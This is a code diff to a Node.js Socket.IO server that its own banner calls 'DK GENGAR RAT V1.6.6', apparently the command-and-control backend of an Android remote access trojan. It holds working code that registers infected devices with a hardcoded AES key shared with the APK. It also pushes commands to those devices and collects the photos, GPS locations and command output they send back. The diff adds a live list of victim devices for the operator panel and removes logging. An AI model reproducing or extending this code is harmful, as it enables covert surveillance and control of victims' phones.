@@ -12,8 +12,11 @@ const io = socketIo(server, {
         origin: "*",
         methods: ["GET", "POST"]
     },
-    transports: ['websocket', 'polling'] // Suporte a ambos para garantir conexão
+    transports: ['websocket', 'polling']
 });
+
+// Memória de dispositivos conectados
+let connectedDevices = {};
 
 // Chave e IV para AES (Devem ser iguais aos do APK)
 const SECRET_KEY_STRING = "aGVsbG93b3JsZHNlY3JldGtleQ=="; 
@@ -29,7 +32,6 @@ function decrypt(encryptedValue) {
         decrypted = Buffer.concat([decrypted, decipher.final()]);
         return decrypted.toString();
     } catch (e) {
-        console.error("[ERRO DESCRIPTOGRAFIA]", e.message);
         return null;
     }
 }
@@ -56,12 +58,13 @@ app.get("/health", (req, res) => {
 });
 
 io.on("connection", (socket) => {
-    console.log(`[SISTEMA] Nova conexão: ${socket.id} de ${socket.handshake.address}`);
+    console.log(`[SISTEMA] Nova conexão: ${socket.id}`);
 
-    // Registro simplificado para garantir que o dispositivo apareça
+    // Quando o painel (navegador) conecta, envia a lista de dispositivos atuais
+    socket.emit("device_list", Object.values(connectedDevices));
+
     socket.on("register", (data) => {
         try {
-            console.log(`[SISTEMA] Recebido evento de registro de ${socket.id}`);
             let finalData = data;
             if (typeof data === 'string') {
                 const decrypted = decrypt(data);
@@ -69,8 +72,10 @@ io.on("connection", (socket) => {
                 else finalData = JSON.parse(data);
             }
             
-            console.log(`[REGISTRO SUCESSO] Dispositivo: ${finalData.model} | OS: ${finalData.os}`);
-            socket.deviceData = finalData;
+            finalData.socketId = socket.id;
+            connectedDevices[socket.id] = finalData;
+            
+            console.log(`[REGISTRO SUCESSO] Dispositivo: ${finalData.model}`);
             io.emit("new_device", finalData);
         } catch (e) {
             console.error("[ERRO REGISTRO]", e.message);
@@ -78,7 +83,7 @@ io.on("connection", (socket) => {
     });
 
     socket.on("command", (data) => {
-        console.log(`[COMANDO] ${data.cmd} enviado para os dispositivos`);
+        console.log(`[COMANDO] ${data.cmd} enviado`);
         const encryptedCmd = encrypt(JSON.stringify(data));
         socket.broadcast.emit("command", {
             plain: data,
@@ -89,44 +94,35 @@ io.on("connection", (socket) => {
     socket.on("result", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         const finalMsg = decrypted ? JSON.parse(decrypted).msg : (typeof encryptedData === 'string' ? encryptedData : JSON.stringify(encryptedData));
-        console.log(`[RESULTADO] ${finalMsg}`);
         io.emit("server_log", finalMsg);
     });
 
     socket.on("photo_captured", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            try {
-                const data = JSON.parse(decrypted);
-                console.log("[MÍDIA] Foto recebida");
-                io.emit("display_photo", data.image);
-                io.emit("server_log", "📸 Foto recebida com sucesso!");
-            } catch (e) {
-                console.error("[ERRO FOTO]", e.message);
-            }
+            const data = JSON.parse(decrypted);
+            io.emit("display_photo", data.image);
+            io.emit("server_log", "📸 Foto recebida!");
         }
     });
 
     socket.on("location_received", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            try {
-                const data = JSON.parse(decrypted);
-                console.log(`[GPS] Lat: ${data.lat}, Lon: ${data.lon}`);
-                io.emit("display_location", data);
-                io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
-            } catch (e) {
-                console.error("[ERRO GPS]", e.message);
-            }
+            const data = JSON.parse(decrypted);
+            io.emit("display_location", data);
+            io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
         }
     });
 
-    socket.on("disconnect", (reason) => {
-        console.log(`[SISTEMA] Conexão encerrada: ${socket.id} | Motivo: ${reason}`);
+    socket.on("disconnect", () => {
+        console.log(`[SISTEMA] Conexão encerrada: ${socket.id}`);
+        delete connectedDevices[socket.id];
+        io.emit("device_list", Object.values(connectedDevices));
     });
 });
 
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-    console.log(`DK GENGAR RAT V1.6.5 rodando na porta ${PORT}`);
+    console.log(`DK GENGAR RAT V1.6.6 rodando na porta ${PORT}`);
 });
